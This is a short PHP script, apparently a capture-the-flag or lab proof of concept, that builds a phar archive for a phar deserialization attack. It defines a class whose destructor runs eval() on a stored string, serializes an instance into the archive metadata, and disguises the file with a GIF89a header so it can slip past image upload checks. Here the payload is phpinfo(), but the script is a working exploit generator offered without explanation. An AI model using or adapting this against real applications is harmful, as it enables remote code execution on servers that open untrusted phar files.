<?php

class AnyClass{
	    function __destruct()
		        {
				        eval($this -> data);
					    }
}
$phar = new Phar('phar2.phar');
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$object = new AnyClass();
$object -> data = 'phpinfo();';
$phar -> setMetadata($object);
$phar -> stopBuffering();
?>
